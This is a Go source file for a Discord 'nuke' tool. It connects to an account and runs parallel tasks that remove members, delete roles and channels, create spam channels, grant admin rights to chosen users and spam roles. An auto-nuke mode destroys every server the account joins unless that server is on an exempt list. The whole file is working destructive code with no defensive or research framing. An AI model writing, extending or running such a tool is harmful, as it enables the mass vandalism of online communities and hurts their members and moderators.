package main

import (
	"fmt"
	"math/rand"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"golang.org/x/exp/slices"
)

func (na NukeAccount) BeginNuke() error {
	err := na.Session.Open()
	if err != nil {
		return err
	}

	if na.Config.FeatureConfig.AutoNuke.Enabled {
		wg := sync.WaitGroup{}
		wg.Add(1)
		na.Session.AddHandler(func(s *discordgo.Session, m *discordgo.GuildCreate) {
			targets := na.Config.FeatureConfig.AutoNuke.TargetOnly
			if len(targets) > 0 {
				if slices.Contains(targets, m.ID) {
					na.nukeOneGuild(m.ID)
				}
				return
			}
			exempt := na.Config.FeatureConfig.AutoNuke.ExemptGuilds
			if slices.Contains(exempt, m.ID) {
				return
			}
			na.nukeOneGuild(m.ID)
		})
		fmt.Println("Auto nuke is listening for server-join events")
		wg.Wait()
		return nil
	}
	na.startNukeTasks()
	return nil
}

// Requires gateway connection to be already open
func (na NukeAccount) nukeOneGuild(guildID string) {
	newBot := na
	newBot.Config.GuildID = guildID
	newBot.startNukeTasks()
}

type Feature struct {
	Enabled  bool
	Function func() error
}

func (na NukeAccount) startNukeTasks() {

	fc := na.Config.FeatureConfig

	tasks := []Feature{
		{
			Function: na.removeMembers,
			Enabled:  fc.MemberRemoval.Enabled,
		},
		{
			Function: na.deleteRoles,
			Enabled:  fc.DeleteRoles,
		},
		{
			Function: na.deleteChannels,
			Enabled:  fc.DeleteChannels,
		},
		{
			Function: na.makeChannels,
			Enabled:  fc.AfterChannel.Enabled,
		},
		{
			Function: na.autoAdmin,
			Enabled:  len(fc.AutoAdmin) > 0,
		},
		{
			Function: na.roleSpam,
			Enabled:  fc.RoleSpam.Enabled,
		},
	}
	wg := sync.WaitGroup{}
	for _, feature := range tasks {
		if feature.Enabled {
			wg.Add(1)
			go func(feature func() error) {
				err := feature()
				if err != nil {
					logger.Errorln(err)
				}
				wg.Done()
			}(feature.Function)
		}
	}
	wg.Wait()
}

func (na NukeAccount) getGuildMemberIDs() []string {
	randGen := rand.New(rand.NewSource(time.Now().UnixNano()))
	ids := []string{}
	collected := make(chan bool)
	na.Session.AddHandlerOnce(func(s *discordgo.Session, chunk *discordgo.GuildMembersChunk) {
		for _, member := range chunk.Members {
			ids = append(ids, member.User.ID)
		}
		collected <- true
	})
	na.Session.RequestGuildMembers(na.Config.GuildID, "", 0, fmt.Sprint(randGen.Intn(10000000)), false)
	<-collected
	return ids
}
